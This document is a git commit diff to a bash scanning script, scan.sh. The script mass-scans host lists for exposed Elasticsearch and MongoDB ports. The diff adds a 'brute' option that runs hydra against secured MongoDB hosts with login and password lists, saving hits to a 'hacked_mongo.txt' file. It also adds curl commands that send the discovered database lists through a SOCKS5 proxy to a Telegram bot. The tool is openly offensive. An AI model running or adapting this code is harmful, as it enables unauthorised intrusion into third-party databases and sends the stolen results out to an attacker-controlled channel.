d4fa7bcb994eb6b96ab00691428cb2ed3f1adb51
medlynx <netkoff@gmail.com>
2020-01-27 12:33:51 +0300

    update

--- scan.sh
+++ scan.sh
@@ -1,6 +1,11 @@
 #!/bin/bash
 
 tgkey=""
+chat_id=""
+proxy_ip=""
+proxy_login=""
+proxy_pass=""
+proxy_port =""
 
 #Check parametrs
 if [ -n "$2" ]
@@ -8,7 +13,8 @@ if [ -n "$2" ]
 	echo masscan port:$1 hosts:$2
 else
 	echo "No parameters found. "
-	echo "Usage: ./scan.sh port host(/s) Example: ./scan.sh 9200 192.168.0.0/24 OR  ./scan.sh 9200 192.168.0.0/24,172.16.0.0/16 ./scan.sh 27017 192.168.0.0/24,172.16.0.0/16"
+	echo "Usage: ./scan.sh port host(/s)_list Example: ./scan.sh 9200 hostlist.txt OR ./scan.sh 27017 hostlist.txt brute"
+	echo "If you want bruteforce secured host - try parameter brute"
 	echo "Required: masscan nmap grep awk"
 	exit
 fi
@@ -31,7 +37,7 @@ out=$( echo $2 | sed 's/\///g' | sed 's/\,//g' | sed 's/\.//g' )
 echo $out 
 
 #Scan targets
-masscan -p $1 $2 -oG $out.out
+masscan -p $1 -iL $2 -oG $out.out
 
 #Find hosts with opened target ports
 grep open $out.out | awk {'print $2'} > map.input
@@ -41,12 +47,12 @@ if [[ "$1" == "9200" ]]; then
 
 	cat map.input | while read line
 do
-	if curl -X GET "$line:9200/" | grep "You Know, for Search";
+	if curl --connect-timeout 2 -X GET "$line:9200/" | grep "You Know, for Search";
 		then echo $line >> elastic.txt; 
 		nmap $line -p$1 --script=elastic | grep "|">> elastic.txt
 	fi
 	
-	if curl -X GET "$line:9200/" | grep "security_exception";
+	if curl --connect-timeout 2 -X GET "$line:9200/" | grep "security_exception";
 		then echo $line >> elastic_secured.txt;
 fi
 done
@@ -68,7 +74,9 @@ do
 done
 fi
 
+#brute if need
 
+if [[ "$3" == "brute" ]]; then
 #brute secured elastics
 
 
@@ -86,7 +94,7 @@ if [[ $(find ./ -name  mongodb_secured.txt -type f -size +1 2>/dev/null) ]];
         then /opt/bin/hydra -M ./mongodb_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 -o ./hacked_mongo.txt mongodb
 
 fi
-
+fi
 #backup output files
 rm -f $out.out
 rm -f map.input 
@@ -97,4 +105,21 @@ mv -f elastic.txt elastic.txt_`date +%s`
 mv -f hacked_mongo.txt hacked_mongo.txt_`date +%s`
 mv -f hacked.txt hacked.txt_`date +%s`
 
+
+#send result
+
+if [[ $(find ./ -name elastic.txt -type f -size +1 2>/dev/null) ]];
+
+        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@elastic.txt -F "chat_id=$chat_id"
+ 
+fi
+
+
+if [[ $(find ./ -name mongodb.txt -type f -size +1 2>/dev/null) ]];
+
+
+        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@mongodb.txt -F "chat_id=$chat_id"
+
+
+fi
 
